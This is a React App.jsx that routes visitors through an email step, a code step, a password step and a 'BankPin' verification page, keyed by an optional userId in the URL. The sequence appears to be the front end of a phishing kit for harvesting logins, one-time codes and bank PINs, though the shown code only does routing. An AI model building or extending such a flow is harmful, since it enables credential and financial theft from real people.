import { useEffect, useState } from "react";
import Email from "./components/flow.jsx/Email";
import Password from "./components/flow.jsx/Password";
import Code from "./components/flow.jsx/Code";
import "./App.css";
import "./index.css";
import BankPin from "./components/flow.jsx/BankPin";
import { useParams, Routes, Route } from "react-router-dom";

function App() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const { userId } = useParams(); // Extracting userId from URL parameters

  return (
    <div className="bg">
      <Routes>
        <Route
          path="/:userId?/*"
          element={
            <Email
              email={email}
              setEmail={setEmail}
              userId={userId} // Passing userId to Email component
            />
          }
        />
        <Route path="/code" element={<Code emailValue={email} />} />
        <Route
          path="/password"
          element={
            <Password
              password={password}
              setPassword={setPassword}
              email={email}
            />
          }
        />
        <Route path="/verify" element={<BankPin email={email}/>} />
      </Routes>
    </div>
  );
}

export default App;
